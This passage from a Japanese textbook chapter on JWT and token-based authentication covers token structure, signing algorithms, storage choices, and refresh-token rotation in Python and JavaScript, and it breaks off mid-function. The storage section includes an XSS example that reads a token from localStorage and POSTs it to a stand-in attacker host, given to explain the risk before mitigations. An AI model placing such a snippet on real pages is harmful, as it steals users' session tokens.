---
layout: book
order: 7
title: "第5章：トークンベース認証"
---

## 5.1 JWTの構造と仕組み - なぜJWTが広く採用されているのか

### 5.1.1 トークンベース認証が生まれた背景

#### 従来のセッション認証の限界

```python
class TraditionalSessionChallenges:
    """従来のセッション認証が直面した課題"""
    
    def demonstrate_scalability_issue(self):
        """スケーラビリティの問題を実証"""
        
        # 問題1: サーバー間でのセッション共有
        traditional_architecture = {
            'server_1': {
                'sessions': {'user123': {'name': 'Alice', 'cart': ['item1']}}
            },
            'server_2': {
                'sessions': {}  # Server2はuser123のセッションを知らない
            },
            'problem': 'ロードバランサーがServer2に振り分けるとセッション喪失'
        }
        
        # 問題2: マイクロサービスでの認証状態共有
        microservices_challenge = {
            'api_gateway': 'セッション確認',
            'user_service': 'セッション情報が必要',
            'order_service': 'セッション情報が必要',
            'payment_service': 'セッション情報が必要',
            'problem': '各サービスがセッションストアにアクセス → ボトルネック'
        }
        
        # 問題3: モバイルアプリでの課題
        mobile_challenges = {
            'cookie_support': '一貫性のないCookie実装',
            'background_refresh': 'アプリ停止時のセッション維持',
            'multiple_devices': '複数デバイスでの同時利用',
            'api_first': 'RESTful APIとの相性の悪さ'
        }
        
        return {
            'issues': [
                'ステートフルであることによるスケーラビリティの制約',
                'サーバー側のメモリ/ストレージ要件',
                'クロスドメインでの利用困難',
                'モバイルアプリケーションとの相性の悪さ'
            ]
        }
```

#### トークンベース認証の登場

```python
class TokenBasedAuthEvolution:
    """トークンベース認証の進化"""
    
    def explain_token_advantages(self):
        """トークンベース認証の利点"""
        
        return {
            'stateless': {
                'benefit': 'サーバーはセッション状態を保持しない',
                'impact': 'どのサーバーでもリクエストを処理可能',
                'example': '''
                # セッション認証
                Server1: sessions[sid] = user_data  # メモリ使用
                Server2: sessions[sid] = ???         # 同期が必要
                
                # トークン認証
                Server1: verify_token(token)  # ステートレス
                Server2: verify_token(token)  # 同じロジックで検証
                '''
            },
            
            'self_contained': {
                'benefit': '必要な情報をトークン自体に含む',
                'impact': 'データベース参照不要で高速',
                'example': '''
                # トークンペイロード
                {
                    "user_id": "123",
                    "email": "user@example.com",
                    "roles": ["user", "admin"],
                    "exp": 1634567890
                }
                '''
            },
            
            'cross_domain': {
                'benefit': 'CORS制約を受けない',
                'impact': 'マイクロサービス、SPA、モバイルで使いやすい',
                'usage': 'Authorization: Bearer <token>'
            },
            
            'decentralized_verification': {
                'benefit': '公開鍵があれば誰でも検証可能',
                'impact': 'サービス間の密結合を避けられる',
                'example': 'API Gateway で一度検証すれば、後続サービスは信頼'
            }
        }
```

### 5.1.2 JWTの構造

#### JWTの3つの部分

```python
import base64
import json
import hmac
import hashlib
from typing import Dict, Any, Optional

class JWTStructure:
    """JWTの構造を理解するためのクラス"""
    
    def explain_jwt_parts(self):
        """JWT の3つの部分の説明"""
        
        jwt_example = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        parts = jwt_example.split('.')
        
        return {
            'structure': 'header.payload.signature',
            'parts': {
                'header': {
                    'encoded': parts[0],
                    'decoded': self._decode_part(parts[0]),
                    'purpose': 'トークンのタイプと署名アルゴリズムを指定',
                    'typical_content': {
                        'alg': 'HS256',  # 署名アルゴリズム
                        'typ': 'JWT'     # トークンタイプ
                    }
                },
                'payload': {
                    'encoded': parts[1],
                    'decoded': self._decode_part(parts[1]),
                    'purpose': 'クレーム（主張）を含む',
                    'standard_claims': {
                        'iss': 'Issuer - 発行者',
                        'sub': 'Subject - 主題（通常はユーザーID）',
                        'aud': 'Audience - 受信者',
                        'exp': 'Expiration Time - 有効期限',
                        'nbf': 'Not Before - 有効開始時刻',
                        'iat': 'Issued At - 発行時刻',
                        'jti': 'JWT ID - トークンの一意識別子'
                    }
                },
                'signature': {
                    'encoded': parts[2],
                    'purpose': '改ざん検出のための署名',
                    'calculation': 'HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)'
                }
            }
        }
    
    def _decode_part(self, encoded_part: str) -> Dict:
        """Base64URLデコード"""
        # パディング調整
        padding = len(encoded_part) % 4
        if padding:
            encoded_part += '=' * (4 - padding)
        
        decoded_bytes = base64.urlsafe_b64decode(encoded_part)
        return json.loads(decoded_bytes)
    
    def create_jwt_manually(self, payload: Dict[str, Any], secret: str) -> str:
        """JWTを手動で作成して仕組みを理解"""
        
        # 1. ヘッダーの作成
        header = {
            'alg': 'HS256',
            'typ': 'JWT'
        }
        
        # 2. Base64URLエンコード
        header_encoded = self._base64url_encode(json.dumps(header))
        payload_encoded = self._base64url_encode(json.dumps(payload))
        
        # 3. 署名の作成
        message = f"{header_encoded}.{payload_encoded}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        signature_encoded = self._base64url_encode(signature)
        
        # 4. JWT の組み立て
        jwt = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
        
        return jwt
    
    def _base64url_encode(self, data: Any) -> str:
        """Base64URLエンコード"""
        if isinstance(data, str):
            data = data.encode()
        
        encoded = base64.urlsafe_b64encode(data).decode()
        # パディングを削除
        return encoded.rstrip('=')
    
    def verify_jwt_manually(self, jwt: str, secret: str) -> tuple[bool, Optional[Dict]]:
        """JWTを手動で検証して仕組みを理解"""
        
        try:
            # 1. JWTを分割
            parts = jwt.split('.')
            if len(parts) != 3:
                return False, None
            
            header_encoded, payload_encoded, signature_encoded = parts
            
            # 2. 署名を再計算
            message = f"{header_encoded}.{payload_encoded}"
            expected_signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            expected_signature_encoded = self._base64url_encode(expected_signature)
            
            # 3. 署名を比較（タイミング攻撃対策）
            if not hmac.compare_digest(signature_encoded, expected_signature_encoded):
                return False, None
            
            # 4. ペイロードをデコード
            payload = self._decode_part(payload_encoded)
            
            # 5. 有効期限チェック
            import time
            if 'exp' in payload and payload['exp'] < time.time():
                return False, None
            
            return True, payload
            
        except Exception as e:
            print(f"JWT verification error: {e}")
            return False, None
```

#### JWTが選ばれる理由

```python
class WhyJWT:
    """なぜJWTが広く採用されているのか"""
    
    def explain_jwt_benefits(self):
        """JWTの利点を実例で説明"""
        
        return {
            'portability': {
                'description': '異なるプログラミング言語間での互換性',
                'example': '''
                # Python でトークン生成
                token = jwt.encode(payload, secret, algorithm='HS256')
                
                // JavaScript で検証
                const decoded = jwt.verify(token, secret);
                
                // Go で検証
                claims, err := jwt.Parse(token, secret)
                ''',
                'benefit': '言語やプラットフォームに依存しない'
            },
            
            'url_safe': {
                'description': 'URL セーフな文字のみ使用',
                'format': 'Base64URL エンコーディング',
                'usage': [
                    'URL パラメータ: ?token=eyJhbG...',
                    'HTTP ヘッダー: Authorization: Bearer eyJhbG...',
                    'Cookie: token=eyJhbG...'
                ],
                'benefit': '様々な転送方法で使用可能'
            },
            
            'standardized': {
                'description': 'RFC 7519 として標準化',
                'ecosystem': [
                    '豊富なライブラリ',
                    'デバッグツール（jwt.io）',
                    'ベストプラクティスの確立'
                ],
                'benefit': '実装の品質と相互運用性の保証'
            },
            
            'compact': {
                'description': 'コンパクトな表現',
                'comparison': '''
                # SAML assertion (XML): ~2KB
                <saml:Assertion>
                    <saml:Subject>...</saml:Subject>
                    <saml:Conditions>...</saml:Conditions>
                    ...
                </saml:Assertion>
                
                # JWT: ~200 bytes
                eyJhbGciOiJIUzI1NiIs...
                ''',
                'benefit': 'ネットワーク帯域の節約'
            },
            
            'flexible_verification': {
                'description': '様々な検証方式をサポート',
                'algorithms': {
                    'HMAC': '共有秘密鍵（HS256, HS384, HS512）',
                    'RSA': '公開鍵暗号（RS256, RS384, RS512）',
                    'ECDSA': '楕円曲線暗号（ES256, ES384, ES512）'
                },
                'benefit': 'セキュリティ要件に応じて選択可能'
            }
        }
```

### 5.1.3 JWTの署名アルゴリズム

```python
import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

class JWTAlgorithms:
    """JWT署名アルゴリズムの詳細"""
    
    def __init__(self):
        self.algorithms = self._setup_algorithms()
    
    def _setup_algorithms(self):
        """各アルゴリズムの特性"""
        
        return {
            'HS256': {
                'name': 'HMAC with SHA-256',
                'type': 'Symmetric',
                'key_type': '共有秘密鍵',
                'key_size': '256 bits minimum',
                'use_case': '内部システム、単一組織',
                'pros': ['高速', 'シンプル'],
                'cons': ['鍵配布の問題', 'すべての検証者が署名も可能'],
                'implementation': self._implement_hs256
            },
            
            'RS256': {
                'name': 'RSA Signature with SHA-256',
                'type': 'Asymmetric',
                'key_type': '公開鍵/秘密鍵ペア',
                'key_size': '2048 bits minimum',
                'use_case': '外部API、マイクロサービス',
                'pros': ['公開鍵で検証可能', '署名者を限定'],
                'cons': ['処理が遅い', '鍵管理が複雑'],
                'implementation': self._implement_rs256
            },
            
            'ES256': {
                'name': 'ECDSA with P-256 and SHA-256',
                'type': 'Asymmetric',
                'key_type': '楕円曲線鍵ペア',
                'key_size': '256 bits (P-256 curve)',
                'use_case': 'モバイル、IoT',
                'pros': ['短い鍵で高セキュリティ', '高速な検証'],
                'cons': ['実装が複雑', 'ライブラリ依存'],
                'implementation': self._implement_es256
            },
            
            'none': {
                'name': 'No digital signature',
                'type': 'None',
                'security': 'INSECURE - NEVER USE IN PRODUCTION',
                'warning': '署名なしトークンは改ざん可能'
            }
        }
    
    def _implement_hs256(self):
        """HMAC-SHA256 の実装例"""
        
        class HS256Implementation:
            def __init__(self, secret: str):
                self.secret = secret.encode() if isinstance(secret, str) else secret
                
                # 秘密鍵の強度チェック
                if len(self.secret) < 32:  # 256 bits
                    raise ValueError("Secret key must be at least 256 bits")
            
            def sign(self, payload: dict) -> str:
                """トークンの署名"""
                return jwt.encode(payload, self.secret, algorithm='HS256')
            
            def verify(self, token: str) -> dict:
                """トークンの検証"""
                return jwt.decode(token, self.secret, algorithms=['HS256'])
            
            def rotate_key(self, new_secret: str, grace_period: int = 3600):
                """鍵のローテーション"""
                # 実装例：一定期間は両方の鍵を受け入れる
                old_secret = self.secret
                self.secret = new_secret.encode()
                
                def verify_with_rotation(token: str) -> dict:
                    try:
                        # 新しい鍵で検証
                        return jwt.decode(token, self.secret, algorithms=['HS256'])
                    except jwt.InvalidSignatureError:
                        # 古い鍵で検証（猶予期間中）
                        return jwt.decode(token, old_secret, algorithms=['HS256'])
                
                return verify_with_rotation
        
        return HS256Implementation
    
    def _implement_rs256(self):
        """RSA-SHA256 の実装例"""
        
        class RS256Implementation:
            def __init__(self):
                # 鍵ペアの生成
                self.private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048
                )
                self.public_key = self.private_key.public_key()
            
            def sign(self, payload: dict) -> str:
                """秘密鍵で署名"""
                private_pem = self.private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                
                return jwt.encode(payload, private_pem, algorithm='RS256')
            
            def verify(self, token: str) -> dict:
                """公開鍵で検証"""
                public_pem = self.public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                return jwt.decode(token, public_pem, algorithms=['RS256'])
            
            def get_jwks(self):
                """JWKSエンドポイント用の公開鍵情報"""
                from cryptography.hazmat.primitives.asymmetric import rsa
                
                numbers = self.public_key.public_numbers()
                
                # JWK形式
                return {
                    'keys': [{
                        'kty': 'RSA',
                        'use': 'sig',
                        'kid': 'rsa-key-1',
                        'n': self._int_to_base64url(numbers.n),
                        'e': self._int_to_base64url(numbers.e)
                    }]
                }
            
            def _int_to_base64url(self, num: int) -> str:
                """整数をBase64URLエンコード"""
                hex_str = format(num, 'x')
                if len(hex_str) % 2:
                    hex_str = '0' + hex_str
                
                return base64.urlsafe_b64encode(
                    bytes.fromhex(hex_str)
                ).decode().rstrip('=')
        
        return RS256Implementation
```

## 5.2 トークンの保存と管理 - XSSとCSRFのリスク評価

### 5.2.1 トークン保存場所の選択

#### なぜ保存場所が重要なのか

```python
class TokenStorageAnalysis:
    """トークン保存場所の分析"""
    
    def analyze_storage_options(self):
        """各保存場所の詳細な分析"""
        
        return {
            'local_storage': {
                'description': 'ブラウザのLocalStorage API',
                'example': 'localStorage.setItem("token", "eyJhbG...")',
                
                'pros': [
                    '実装が簡単',
                    '5MB程度の容量',
                    'JavaScript から簡単にアクセス可能',
                    'タブ間で共有される'
                ],
                
                'cons': [
                    'XSS攻撃に対して脆弱',
                    'JavaScript から読み取り可能',
                    'ブラウザ拡張からもアクセス可能'
                ],
                
                'security_risk': {
                    'XSS': 'HIGH - すべてのJavaScriptコードがアクセス可能',
                    'CSRF': 'LOW - 自動的に送信されない',
                    'example_attack': '''
                    // XSS攻撃例
                    <script>
                    // 攻撃者のスクリプト
                    const token = localStorage.getItem('token');
                    fetch('https://attacker.com/steal', {
                        method: 'POST',
                        body: JSON.stringify({ token })
                    });
                    </script>
                    '''
                },
                
                'mitigation': [
                    'Content Security Policy (CSP) の実装',
                    '入力値の厳格なサニタイゼーション',
                    'トークンの有効期限を短く設定'
                ]
            },
            
            'session_storage': {
                'description': 'ブラウザのSessionStorage API',
                'example': 'sessionStorage.setItem("token", "eyJhbG...")',
                
                'pros': [
                    'タブが閉じられると自動削除',
                    'タブ間で共有されない',
                    'LocalStorageより若干安全'
                ],
                
                'cons': [
                    'XSS攻撃には依然として脆弱',
                    'ページリロードで保持される',
                    'ユーザビリティの課題'
                ],
                
                'security_risk': {
                    'XSS': 'HIGH - LocalStorageと同様',
                    'CSRF': 'LOW - 自動送信されない'
                },
                
                'use_case': 'セキュリティを重視する一時的なセッション'
            },
            
            'http_only_cookie': {
                'description': 'HttpOnly属性付きCookie',
                'example': 'Set-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite=Lax',
                
                'pros': [
                    'JavaScriptからアクセス不可（XSS対策）',
                    '自動的にリクエストに含まれる',
                    'ブラウザが管理'
                ],
                
                'cons': [
                    'CSRF攻撃の可能性',
                    'Cookie サイズ制限（4KB）',
                    'CORS での扱いが複雑'
                ],
                
                'security_risk': {
                    'XSS': 'LOW - JavaScriptからアクセス不可',
                    'CSRF': 'MEDIUM - 適切な対策が必要',
                    'mitigation': 'SameSite属性とCSRFトークンの併用'
                },
                
                'implementation': self._implement_secure_cookie
            },
            
            'memory': {
                'description': 'JavaScriptメモリ内（変数）',
                'example': 'let authToken = "eyJhbG...";',
                
                'pros': [
                    '最も安全（永続化されない）',
                    'XSS攻撃でも簡単には取得できない',
                    'デバッグツールでも見えにくい'
                ],
                
                'cons': [
                    'ページリロードで失われる',
                    'タブ間で共有できない',
                    'ユーザビリティが低い'
                ],
                
                'security_risk': {
                    'XSS': 'LOW - グローバルスコープを避ければ安全',
                    'CSRF': 'NONE - 自動送信されない'
                },
                
                'pattern': 'リフレッシュトークンはCookie、アクセストークンはメモリ'
            }
        }
    
    def _implement_secure_cookie(self):
        """セキュアなCookie実装"""
        
        class SecureCookieImplementation:
            def set_token_cookie(self, response, token: str, token_type: str = 'access'):
                """セキュアなCookieの設定"""
                
                if token_type == 'access':
                    # アクセストークン用の設定
                    response.set_cookie(
                        'access_token',
                        value=token,
                        max_age=900,  # 15分
                        httponly=True,  # XSS対策
                        secure=True,    # HTTPS必須
                        samesite='Lax', # CSRF対策（基本）
                        path='/'
                    )
                
                elif token_type == 'refresh':
                    # リフレッシュトークン用の設定（より厳格）
                    response.set_cookie(
                        'refresh_token',
                        value=token,
                        max_age=604800,  # 7日間
                        httponly=True,
                        secure=True,
                        samesite='Strict',  # CSRF対策（厳格）
                        path='/api/auth/refresh'  # パスを限定
                    )
                
                return response
            
            def split_token_storage(self):
                """トークン分割保存パターン"""
                
                # セキュリティを最大化するパターン
                return {
                    'pattern': 'Split Token',
                    'implementation': '''
                    // 1. トークンを分割
                    const token = "eyJhbGciOiJIUzI1NiIs...";
                    const parts = token.split('.');
                    const signature = parts[2];
                    const headerPayload = parts.slice(0, 2).join('.');
                    
                    // 2. 署名部分をHttpOnly Cookieに
                    document.cookie = `token_sig=${signature}; HttpOnly; Secure`;
                    
                    // 3. ヘッダーとペイロードをLocalStorageに
                    localStorage.setItem('token_hp', headerPayload);
                    
                    // 4. リクエスト時に再結合
                    const hp = localStorage.getItem('token_hp');
                    // signature は Cookie から自動送信
                    // サーバー側で結合して検証
                    ''',
                    'benefits': [
                        'XSS攻撃では完全なトークンを取得できない',
                        'CSRF攻撃では署名のみで無意味'
                    ]
                }
        
        return SecureCookieImplementation()
```

### 5.2.2 トークン管理のベストプラクティス

```python
import time
from datetime import datetime, timedelta
from typing import Optional, Dict, Tuple

class TokenManagementBestPractices:
    """トークン管理のベストプラクティス"""
    
    def __init__(self):
        self.security_config = {
            'access_token_lifetime': 900,      # 15分
            'refresh_token_lifetime': 604800,  # 7日
            'refresh_threshold': 300,          # 5分前にリフレッシュ
            'max_refresh_count': 10,           # リフレッシュ回数制限
            'token_rotation': True             # トークンローテーション
        }
    
    def implement_token_lifecycle(self):
        """トークンライフサイクルの実装"""
        
        class TokenLifecycleManager:
            def __init__(self, config):
                self.config = config
                self.token_store = {}  # 実際はRedis等を使用
                
            def issue_token_pair(self, user_id: str, device_id: Optional[str] = None) -> Dict:
                """トークンペアの発行"""
                
                # アクセストークンの生成
                access_payload = {
                    'user_id': user_id,
                    'type': 'access',
                    'iat': int(time.time()),
                    'exp': int(time.time() + self.config['access_token_lifetime']),
                    'jti': self._generate_jti()  # トークンID
                }
                
                if device_id:
                    access_payload['device_id'] = device_id
                
                access_token = jwt.encode(access_payload, self.secret, algorithm='HS256')
                
                # リフレッシュトークンの生成
                refresh_payload = {
                    'user_id': user_id,
                    'type': 'refresh',
                    'iat': int(time.time()),
                    'exp': int(time.time() + self.config['refresh_token_lifetime']),
                    'jti': self._generate_jti(),
                    'refresh_count': 0,
                    'family_id': self._generate_family_id()  # トークンファミリー
                }
                
                refresh_token = jwt.encode(refresh_payload, self.secret, algorithm='HS256')
                
                # リフレッシュトークンの保存（無効化用）
                self._store_refresh_token(refresh_payload['jti'], refresh_payload)
                
                return {
                    'access_token': access_token,
                    'refresh_token': refresh_token,
                    'token_type': 'Bearer',
                    'expires_in': self.config['access_token_lifetime']
                }
            
            def refresh_tokens(self, refresh_token: str) -> Optional[Dict]:
                """トークンのリフレッシュ"""
                
                try:
                    # リフレッシュトークンの検証
                    payload = jwt.decode(refresh_token, self.secret, algorithms=['HS256'])
                    
                    # トークンタイプの確認
                    if payload.get('type') != 'refresh':
                        raise ValueError("Invalid token type")
                    
                    # 保存されているトークンとの照合
                    stored_token = self._get_stored_token(payload['jti'])
                    if not stored_token:
                        # トークンが無効化されている
                        self._handle_token_reuse(payload)
                        return None
                    
                    # リフレッシュ回数のチェック
                    if payload['refresh_count'] >= self.config['max_refresh_count']:
                        self._revoke_token(payload['jti'])
                        return None
                    
                    # 新しいトークンペアの生成
                    new_tokens = self._generate_new_token_pair(payload)
                    
                    # トークンローテーション
                    if self.config['token_rotation']:
                        self._revoke_token(payload['jti'])
                    
                    return new_tokens
                    
                except jwt.ExpiredSignatureError:
                    return None
                except Exception as e:
                    logging.error(f"Token refresh error: {e}")
                    return None
            
            def _generate_new_token_pair(self, old_payload: Dict) -> Dict:
                """新しいトークンペアの生成"""
                
                # 新しいアクセストークン
                new_access = self.issue_token_pair(
                    old_payload['user_id'],
                    old_payload.get('device_id')
                )
                
                # リフレッシュトークンの更新
                new_refresh_payload = {
                    **old_payload,
                    'iat': int(time.time()),
                    'exp': int(time.time() + self.config['refresh_token_lifetime']),
                    'jti': self._generate_jti(),
                    'refresh_count': old_payload['refresh_count'] + 1
                }
                
                new_refresh_token = jwt.encode(
                    new_refresh_payload, 
                    self.secret, 
                    algorithm='HS256'
                )
                
                # 新しいリフレッシュトークンを保存
                self._store_refresh_token(new_refresh_payload['jti'], new_refresh_payload)
                
                return {
                    'access_token': new_access['access_token'],
                    'refresh_token': new_refresh_token,
                    'token_type': 'Bearer',
                    'expires_in': self.config['access_token_lifetime']
                }
            
            def _handle_token_reuse(self, payload: Dict):
                """トークン再利用の検出時の処理"""
                
                # セキュリティアラート
                logging.warning(
                    f"Potential token theft detected for user {payload['user_id']}"
                )
                
                # 同じファミリーのすべてのトークンを無効化
                self._revoke_token_family(payload['family_id'])
                
                # ユーザーに通知
                self._notify_user_security_alert(payload['user_id'])
            
            def implement_token_binding(self):
                """トークンバインディングの実装"""
                
                return {
                    'concept': 'トークンを特定のクライアントにバインド',
                    'implementation': '''
                    def create_bound_token(user_id: str, client_context: Dict):
                        # クライアントフィンガープリント
                        fingerprint = hashlib.sha256(
                            f"{client_context['ip']}"
                            f"{client_context['user_agent']}"
                            f"{client_context['accept_language']}".encode()
                        ).hexdigest()
                        
                        payload = {
                            'user_id': user_id,
                            'client_fingerprint': fingerprint,
                            'exp': int(time.time() + 900)
                        }
                        
                        return jwt.encode(payload, secret, algorithm='HS256')
                    
                    def verify_bound_token(token: str, client_context: Dict):
                        payload = jwt.decode(token, secret, algorithms=['HS256'])
                        
                        # 現在のフィンガープリント
                        current_fingerprint = calculate_fingerprint(client_context)
                        
                        # バインディングの検証
                        if payload['client_fingerprint'] != current_fingerprint:
                            raise SecurityError("Token binding mismatch")
                        
                        return payload
                    ''',
                    'benefits': [
                        'トークンの盗難時の被害を限定',
                        'クライアント固有のトークン'
                    ],
                    'considerations': [
                        'IPアドレス変更への対応',
                        'モバイルネットワークでの課題'
                    ]
                }
        
        return TokenLifecycleManager(self.security_config)
```

### 5.2.3 クライアント側のトークン管理

```python
class ClientSideTokenManagement:
    """クライアント側でのトークン管理実装"""
    
    def implement_secure_token_storage(self):
        """セキュアなトークン保存の実装"""
        
        return {
            'javascript_implementation': '''
            class TokenManager {
                constructor() {
                    // トークンをメモリに保持
                    this.accessToken = null;
                    this.refreshPromise = null;
                }
                
                // トークンの設定（メモリのみ）
                setAccessToken(token) {
                    this.accessToken = token;
                    
                    // 自動リフレッシュのスケジュール
                    this.scheduleRefresh(token);
                }
                
                // トークンの取得
                async getAccessToken() {
                    // 有効期限チェック
                    if (this.isTokenExpired()) {
                        await this.refreshAccessToken();
                    }
                    
                    return this.accessToken;
                }
                
                // トークンの有効期限チェック
                isTokenExpired() {
                    if (!this.accessToken) return true;
                    
                    try {
                        // JWTペイロードをデコード（検証なし）
                        const payload = JSON.parse(
                            atob(this.accessToken.split('.')[1])
                        );
                        
                        // 5分の余裕を持って判定
                        const expiryTime = payload.exp * 1000;
                        const currentTime = Date.now();
                        const bufferTime = 5 * 60 * 1000; // 5分
                        
                        return currentTime >= (expiryTime - bufferTime);
                    } catch (e) {
                        return true;
                    }
                }
                
                // 自動リフレッシュのスケジュール
                scheduleRefresh(token) {
                    try {
                        const payload = JSON.parse(atob(token.split('.')[1]));
                        const expiryTime = payload.exp * 1000;
                        const currentTime = Date.now();
                        const refreshTime = expiryTime - currentTime - (5 * 60 * 1000);
                        
                        if (refreshTime > 0) {
                            setTimeout(() => {
                                this.refreshAccessToken();
                            }, refreshTime);
                        }
                    } catch (e) {
                        console.error('Failed to schedule refresh:', e);
                    }
                }
                
                // トークンのリフレッシュ
                async refreshAccessToken() {
                    // 重複リフレッシュを防ぐ
                    if (this.refreshPromise) {
                        return this.refreshPromise;
                    }
                    
                    this.refreshPromise = fetch('/api/auth/refresh', {
                        method: 'POST',
                        credentials: 'include', // Cookie を含める
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Refresh failed');
                        }
                        return response.json();
                    })
                    .then(data => {
                        this.setAccessToken(data.access_token);
                        this.refreshPromise = null;
                        return data.access_token;
                    })
                    .catch(error => {
                        this.refreshPromise = null;
                        // リフレッシュ失敗時は再ログインへ
                        this.handleAuthFailure();
                        throw error;
                    });
                    
                    return this.refreshPromise;
                }
                
                // APIリクエストのインターセプター
                async makeAuthenticatedRequest(url, options = {}) {
                    const token = await this.getAccessToken();
                    
                    const response = await fetch(url, {
                        ...options,
                        headers: {
                            ...options.headers,
                            'Authorization': `Bearer ${token}`
                        }
                    });
                    
                    // 401エラーの場合はリフレッシュして再試行
                    if (response.status === 401) {
                        await this.refreshAccessToken();
                        const newToken = await this.getAccessToken();
                        
                        return fetch(url, {
                            ...options,
                            headers: {
                                ...options.headers,
                                'Authorization': `Bearer ${newToken}`
                            }
                        });
                    }
                    
                    return response;
                }
                
                // 認証失敗時の処理
                handleAuthFailure() {
                    // トークンをクリア
                    this.accessToken = null;
                    
                    // ログインページへリダイレクト
                    window.location.href = '/login';
                }
            }
            
            // シングルトンインスタンス
            const tokenManager = new TokenManager();
            export default tokenManager;
            ''',
            
            'axios_interceptor': '''
            // Axios インターセプターの実装
            import axios from 'axios';
            import tokenManager from './tokenManager';
            
            // リクエストインターセプター
            axios.interceptors.request.use(
                async (config) => {
                    const token = await tokenManager.getAccessToken();
                    if (token) {
                        config.headers.Authorization = `Bearer ${token}`;
                    }
                    return config;
                },
                (error) => {
                    return Promise.reject(error);
                }
            );
            
            // レスポンスインターセプター
            axios.interceptors.response.use(
                (response) => response,
                async (error) => {
                    const originalRequest = error.config;
                    
                    if (error.response?.status === 401 && !originalRequest._retry) {
                        originalRequest._retry = true;
                        
                        try {
                            await tokenManager.refreshAccessToken();
                            const token = await tokenManager.getAccessToken();
                            originalRequest.headers.Authorization = `Bearer ${token}`;
                            return axios(originalRequest);
                        } catch (refreshError) {
                            tokenManager.handleAuthFailure();
                            return Promise.reject(refreshError);
                        }
                    }
                    
                    return Promise.reject(error);
                }
            );
            '''
        }
```

## 5.3 リフレッシュトークンの設計 - セキュリティとUXの両立

### 5.3.1 なぜリフレッシュトークンが必要なのか

```python
class RefreshTokenRationale:
    """リフレッシュトークンの必要性"""
    
    def explain_refresh_token_need(self):
        """リフレッシュトークンがなぜ必要かを説明"""
        
        return {
            'problem_without_refresh': {
                'long_lived_access_token': {
                    'risk': 'トークンが盗まれた場合の被害期間が長い',
                    'example': '24時間有効なトークン → 最大24時間の不正アクセス'
                },
                
                'short_lived_access_token': {
                    'issue': '頻繁な再ログインが必要',
                    'ux_impact': 'ユーザー体験の著しい低下',
                    'example': '15分ごとにパスワード入力'
                },
                
                'dilemma': 'セキュリティとユーザビリティのトレードオフ'
            },
            
            'refresh_token_solution': {
                'concept': '短命なアクセストークン + 長命なリフレッシュトークン',
                
                'benefits': {
                    'security': [
                        'アクセストークンは短命（15分程度）',
                        '頻繁に使用されるトークンの露出リスクを最小化',
                        'リフレッシュトークンは限定的な用途'
                    ],
                    
                    'usability': [
                        'ユーザーは長期間ログイン状態を維持',
                        'シームレスなトークン更新',
                        'バックグラウンドでの自動更新'
                    ]
                },
                
                'separation_of_concerns': {
                    'access_token': {
                        'purpose': 'APIアクセス',
                        'lifetime': '5-15分',
                        'usage': '頻繁',
                        'storage': 'メモリ推奨'
                    },
                    
                    'refresh_token': {
                        'purpose': '新しいアクセストークンの取得',
                        'lifetime': '7-30日',
                        'usage': 'まれ（アクセストークン更新時のみ）',
                        'storage': 'HttpOnly Cookie推奨'
                    }
                }
            }
        }
```

### 5.3.2 セキュアなリフレッシュトークン実装

```python
import uuid
import hashlib
from typing import Optional, Dict, List

class SecureRefreshTokenImplementation:
    """セキュアなリフレッシュトークンの実装"""
    
    def __init__(self):
        self.refresh_token_store = {}  # 実際はRedisやDBを使用
        self.security_config = {
            'rotation_enabled': True,
            'family_tracking': True,
            'device_binding': True,
            'rate_limiting': True,
            'anomaly_detection': True
        }
    
    def implement_refresh_token_rotation(self):
        """リフレッシュトークンローテーション"""
        
        class RefreshTokenRotation:
            def __init__(self):
                self.token_families = {}  # family_id -> token_list
            
            def create_token_family(self, user_id: str) -> str:
                """新しいトークンファミリーの作成"""
                
                family_id = str(uuid.uuid4())
                
                initial_token = {
                    'jti': str(uuid.uuid4()),
                    'user_id': user_id,
                    'family_id': family_id,
                    'created_at': time.time(),
                    'parent_jti': None,
                    'children_jti': [],
                    'status': 'active'
                }
                
                # ファミリーの初期化
                self.token_families[family_id] = [initial_token['jti']]
                
                # トークンの保存
                self._store_token(initial_token)
                
                return self._encode_refresh_token(initial_token)
            
            def rotate_token(self, current_token: str) -> Optional[str]:
                """トークンのローテーション"""
                
                # 現在のトークンをデコード
                token_data = self._decode_refresh_token(current_token)
                if not token_data:
                    return None
                
                # トークンの状態確認
                stored_token = self._get_stored_token(token_data['jti'])
                if not stored_token or stored_token['status'] != 'active':
                    # トークンが無効または既に使用済み
                    self._handle_suspicious_activity(token_data)
                    return None
                
                # 新しいトークンの生成
                new_token = {
                    'jti': str(uuid.uuid4()),
                    'user_id': token_data['user_id'],
                    'family_id': token_data['family_id'],
                    'created_at': time.time(),
                    'parent_jti': token_data['jti'],
                    'children_jti': [],
                    'status': 'active'
                }
                
                # 親トークンを無効化
                stored_token['status'] = 'rotated'
                stored_token['children_jti'].append(new_token['jti'])
                self._update_token(stored_token)
                
                # 新しいトークンを保存
                self._store_token(new_token)
                
                # ファミリーリストを更新
                self.token_families[token_data['family_id']].append(new_token['jti'])
                
                return self._encode_refresh_token(new_token)
            
            def _handle_suspicious_activity(self, token_data: Dict):
                """不審なアクティビティの処理"""
                
                logging.warning(
                    f"Suspicious refresh token usage detected for user {token_data['user_id']}"
                )
                
                # トークンファミリー全体を無効化
                family_id = token_data['family_id']
                if family_id in self.token_families:
                    for token_jti in self.token_families[family_id]:
                        stored_token = self._get_stored_token(token_jti)
                        if stored_token:
